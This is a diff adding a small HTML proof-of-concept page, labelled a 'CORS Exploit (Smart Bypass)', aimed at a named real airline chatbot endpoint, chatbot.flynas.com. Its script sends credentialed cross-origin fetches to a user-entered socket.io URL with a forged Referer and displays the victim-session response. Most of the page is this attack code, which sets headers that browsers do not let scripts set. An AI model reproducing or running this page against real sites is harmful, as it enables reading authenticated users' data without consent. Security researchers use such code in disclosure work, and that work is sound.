@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Flynas CORS PoC</title>
+</head>
+<body>
+  <h2>Flynas CORS Exploit (Smart Bypass)</h2>
+  <p>Enter endpoint from <code>chatbot.flynas.com</code> and click Fetch:</p>
+
+  <input id="url" type="text" size="120"
+         placeholder="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling&t=xxxx">
+  <button onclick="fetchData()">Fetch Data</button>
+
+  <h3>Response:</h3>
+  <pre id="output"></pre>
+
+  <script>
+    async function fetchData() {
+      const targetUrl = document.getElementById("url").value;
+      const output = document.getElementById("output");
+      output.textContent = "Fetching...";
+
+      try {
+        const res = await fetch(targetUrl, {
+          method: "GET",
+          mode: "cors",
+          credentials: "include",
+          headers: {
+            "Origin": window.location.origin,   // دومينك على GitHub Pages
+            "Referer": "https://www.flynas.com/",
+            "User-Agent": navigator.userAgent,
+            "Accept": "application/json, text/plain, */*"
+          }
+        });
+
+        const text = await res.text();
+        output.textContent = text;
+      } catch (err) {
+        output.textContent = "Error: " + err;
+      }
+    }
+  </script>
+</body>
+</html>
